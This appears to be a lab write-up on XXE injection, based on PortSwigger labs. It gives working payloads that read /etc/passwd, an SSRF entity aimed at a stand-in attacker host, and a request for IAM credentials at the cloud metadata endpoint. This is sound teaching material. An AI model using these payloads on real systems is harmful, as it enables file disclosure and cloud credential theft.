# XML external entity (XXE) Injection 💉
  This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

  This attack may lead to disclosure of confidential data, denial of service, SSRF, port scanning from the perspective of the machine where parser is located.

  ### Types of XXE Attacks:
  - ***Exploiting XXE to retrieve files***: Where an external entity is defined containing the contents of the file and retured in applications response.
  - ***Exploiting XXE to perform SSRF***: Where an external entity is defined as URL to a back-end systems.
  - ***Exploiting blind XXE exfiltrate data out-of-band***: Sensitive data is transmitted from application server to a system that the atatcker controls.
  - ***Exploiting blind XEE to retrieve data via error message***: Attacker trigger a parsing error message containing sensitive data.

---

  ### Exploiting XXE using external entity to retrieve files.

  Following example is referred from port swingger web security academy, for more details check the reference section below.

  A shopping application (intentionally vulnerable web app) checks for stocks level for a product by submitting a following XML to the server.

  ```
    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck><productId>381</productId></stockCheck>
  ```

  To exploit XXE vulnerability and the task is to retrieve the contents of file /etc/passwd.

  ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
  ```

  Once the crafted payload is sent to the server, the content of the file can be retrieved from the application's response.

  ![image](https://github.com/user-attachments/assets/ac82c5d3-06c8-41c5-a877-2a17d2bd9b7c)

  ---

  ### Exploiting XXE to perform SSRF

  XXE Attack can potentially induce the server-side application to make HTTP request to any URL that the server can access.

  To exploit such attack, we need to define an external XML entity that contains an URL that we want to target and use the defined entity within a data value which makes us be able to see response from target URL within the application's response.

  Example XXE to perform SSRF attacks:

  ```
    <!DOCTYPE foo [<!ENTITY xss-ssrf SYSTEM "http://attacker.com "> ]>
  ```

  Performing XXE attack on the lab on portswinger, view the reference section on more details about the lab.

  The following code is the crafted payload to retrieve the application's sensitive data by using above SSRF attack method mentioned.

  ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe-ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ] >
    <stockCheck>
      <productId>
        &xxe-ssrf;
      </productId>
      <storeId>
        1
      </storeId>
    </stockCheck>
  ```

  This response for this payload retrieves teh sensitive contents of the application.

  ![image](https://github.com/user-attachments/assets/08b1c780-06aa-45a5-90cb-2a7b16ec607a)

---
  ### Blind XXE Injection

  Blind injection occurs when there is no response from application.
  Therefore direct retrieval of files from server-side is not possible.
  
  Use out of band techniques to exploit such vulnerabilities and extract data , also trigger parser error messages to disclose      sensitive data.

  
  
